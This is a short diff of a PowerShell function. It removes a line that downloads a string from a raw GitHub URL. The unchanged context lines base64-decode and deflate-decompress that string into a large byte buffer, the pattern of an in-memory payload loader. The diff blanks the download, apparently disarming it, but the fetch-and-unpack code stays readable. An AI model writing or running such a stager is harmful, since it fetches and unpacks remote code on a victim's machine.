@@ -478,7 +478,7 @@ function test{
     $passed = [string[]]$vars.ToArray()
 
 
-  $b = (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/1/master/64")
+  $b = ""
 	$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($b),[IO.Compression.CompressionMode]::Decompress)
 	$c = New-Object Byte[](833536)
 	$DeflatedStream.Read($c, 0, 833536) | Out-Null
